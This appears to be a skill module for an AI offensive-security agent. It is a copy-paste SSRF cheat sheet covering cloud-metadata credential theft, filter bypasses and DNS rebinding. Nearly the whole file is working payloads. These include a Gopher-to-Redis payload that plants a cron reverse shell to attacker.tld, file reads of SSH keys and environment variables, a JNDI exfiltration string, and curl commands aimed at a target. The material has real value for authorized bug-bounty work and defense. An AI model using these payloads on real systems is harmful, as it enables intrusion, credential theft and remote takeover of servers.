# SKILL: Server-Side Request Forgery (SSRF — Basic / Blind / DNS Rebinding / GopherProtoSmuggling)

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (server-side request forgery (ssrf — basic / blind / dns rebinding / gopherprotosmuggling)) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
SSRF gets you cloud metadata (AWS IMDS, GCP, Azure), internal services, port scan from inside the perimeter, and sometimes RCE via Redis/Memcached/Elasticsearch. I always test cloud metadata first, then internal port scan, then protocol smuggling.

---

## DETECTION
- Any param taking a URL: `?url=`, `?image=`, `?webhook=`, `?fetch=`, `?proxy=`, `?next=`, `?ref=`, file uploads with URL fetcher, HTML→PDF, SSO callbacks.
- Send Burp Collaborator URL — observe DNS / HTTP hit. Out-of-band confirms SSRF.
- Try internal IP: `http://127.0.0.1`, `http://localhost`, `http://[::1]`, `http://0.0.0.0`, `http://169.254.169.254`.

## EXPLOITATION
### Cloud metadata (always start here)
```
http://169.254.169.254/latest/meta-data/                   # AWS IMDSv1
http://169.254.169.254/latest/meta-data/iam/security-credentials/   # then .../<role-name>
http://[fd00:ec2::254]/latest/meta-data/                  # IMDS over IPv6
http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json   # GCP (needs Metadata-Flavor: Google)
http://169.254.169.254/metadata/instance?api-version=2021-02-01   # Azure (needs Metadata: true)
http://100.100.100.200/latest/meta-data/                  # Alibaba
http://169.254.169.254/openstack/latest/                  # OpenStack
http://169.254.169.254/v1.json                            # DigitalOcean
http://169.254.169.254/opc/v1/instance/                   # Oracle
http://169.254.169.254/metadata/v1/                       # Hetzner / various
```

### IMDSv2 (header required — many SSRFs only do GET, IMDSv2 needs PUT for token; harder but not impossible)
```
PUT /latest/api/token    HEADER X-aws-ec2-metadata-token-ttl-seconds: 21600
GET /latest/meta-data/   HEADER X-aws-ec2-metadata-token: <token>
```
If app permits header-injection (CRLF) or full request control (e.g. via Gopher), IMDSv2 still falls.

### Internal services
```
http://127.0.0.1:8080/   # internal admin
http://127.0.0.1:6379/   # Redis (try gopher://)
http://127.0.0.1:9200/   # Elasticsearch
http://127.0.0.1:5984/   # CouchDB
http://127.0.0.1:8500/   # Consul
http://127.0.0.1:2375/   # Docker
http://10.0.0.1/         # private VPC peers
```

## PAYLOADS (real, copy-paste, grouped)
### IP encoding bypasses
```
http://localhost
http://127.0.0.1
http://127.1
http://127.0.1
http://0177.0.0.1            # octal
http://2130706433            # decimal
http://0x7f.0.0.1            # hex
http://0x7f000001            # full hex
http://[::1]
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]
http://①②⑦.0.0.1            # unicode lookalike (some parsers)
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io
http://attacker.tld@127.0.0.1   # auth-section trick
http://127.0.0.1#@allowedhost.com
http://allowedhost.com.attacker.tld
http://allowedhost.com@attacker.tld
```

### Schema bypasses
```
gopher://127.0.0.1:6379/_<URL_ENCODED_REDIS_COMMAND>
dict://127.0.0.1:6379/info
file:///etc/passwd
ftp://attacker.tld/x
ldap://127.0.0.1:389/
sftp://127.0.0.1
tftp://127.0.0.1
ldap://127.0.0.1
jar://https://attacker.tld/x.jar!/
netdoc:///etc/passwd
```

### URL-parser confusion (host header smuggling)
```
http://allowed.com\\@attacker.tld/
http://allowed.com\\.attacker.tld/
http:[email protected]/
http://allowed.com:80@attacker.tld
```

### DNS rebinding (when target validates host then re-resolves)
```
# Use rbndr.us, lock.cmpxchg8b.com/rebinder, or self-host
1.1.1.1.1time.169.254.169.254.repeat.rbndr.us
# First resolution: 1.1.1.1 → passes whitelist
# Second resolution (when actual fetch occurs): 169.254.169.254 → SSRF lands
```

### Gopher → Redis RCE via SSRF
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$59%0d%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-c%20%22bash%20-i%20>%26%20/dev/tcp/attacker.tld/4444%200>%261%22%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
# Use ssrfmap or gopherus to generate cleaner payloads
```

### File-read via SSRF (LFI primitive)
```
file:///etc/passwd
file:///proc/self/environ
file:///proc/self/cmdline
file:///root/.ssh/id_rsa
file:///var/log/auth.log
```

### Blind SSRF — exfiltrate via DNS
```
http://$(whoami).attacker.tld/                  # only if cmd-substitution runs
http://${jndi:ldap://attacker.tld/x}            # if JNDI is in scope (Log4Shell-style)
http://attacker.tld/?token=$AWS_SESSION_TOKEN   # via env-leak in error pages
```

## BYPASS TECHNIQUES
- **Whitelist by string match** (`if 'allowed.com' in url`) → `http://allowed.com.attacker.tld`, `http://attacker.tld#allowed.com`, `http://[email protected]`.
- **Whitelist by regex** with anchors missing → CRLF injection / unicode confusable.
- **Resolved IP check** → DNS rebinding.
- **HTTP-only filter** → use `gopher://`, `dict://`, `ftp://`, `file://`.
- **PORT block list** → use redirects (target fetches your HTTP, you 302 to internal).
- **HEAD-only** → some scrapers only HEAD; still leaks via DNS / via hostname header reflected in response.

## CHAIN POTENTIAL
- SSRF → AWS IMDS creds → S3 read/write → leak DB → RCE → root.
- SSRF → internal admin panel → ATO + tenant takeover.
- SSRF → Redis → RCE.
- SSRF → internal SAML callback → assume identity → SAML federation across services.
- SSRF + path traversal in URL fetcher → arbitrary file read.

## TOOLS
- `ssrfmap` — automation
- `gopherus` — gopher payload generator (Redis, Memcached, MySQL, FastCGI, Smtp, Zabbix)
- `interactsh-client` (PD) — out-of-band server
- Burp Collaborator
- `dnslog.cn`, `webhook.site`, `requestbin.com` (lightweight)
- `rebinder.it`, `lock.cmpxchg8b.com/rebinder` for DNS rebinding

## COMMANDS
```bash
# Set up Collaborator / interactsh
interactsh-client -v   # outputs your-domain.oast.me

# Test endpoint
curl -sk "https://target/fetch?url=https://your-domain.oast.me/canary"
# observe interactsh log; if hit → SSRF confirmed

# AWS IMDS
curl -sk "https://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -sk "https://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<rolename>"

# DNS rebinding setup
# Use https://lock.cmpxchg8b.com/rebinder.html — generates a hostname that flips A record between two IPs

# Gopher payload via ssrfmap
git clone https://github.com/swisskyrepo/SSRFmap && cd SSRFmap
python3 ssrfmap.py -r request.txt -p url -m redis,readfiles,fastcgi
```

## EDGE CASES / NOT-A-BUG TRAPS
- **Cloudflare / WAF strips internal IP literals** — try DNS rebinding or use a CNAME you own pointing at 127.0.0.1.
- **HTTPS-only fetcher** — sometimes accepts `https://internal/`, but you still get cleartext via redirect → http://.
- **Outbound-blocked egress** — DNS still resolves; rely on DNS-only OOB.
- **Server pre-fetches headers (HEAD)** before GET → still leaks `Server:` header of internal service.
- **PDF / image renderer SSRF** — Chromium/wkhtmltopdf renders supplied URL → can fetch internal `<img>`, JS-driven SSRF for richer probes.

## TRIAGE ANGLE (per platform)
- Show metadata-credential extraction *as a screenshot* — never paste raw creds.
- Run `aws sts get-caller-identity` with the leaked creds; redact account ID before paste.
- Note IMDSv2 (if applicable) — proves the engineering team's mitigation gap.

## SEVERITY & CVSS
Cloud-metadata SSRF: 9.0+ (Critical). Internal-only / blind: 6.0–7.5 (Medium-High).

## REFERENCES
PortSwigger SSRF Cheat Sheet • PayloadsAllTheThings/SSRF • Orange Tsai's BlackHat "A New Era of SSRF" • Bug Bounty Bootcamp Ch. 12 • HackTricks SSRF
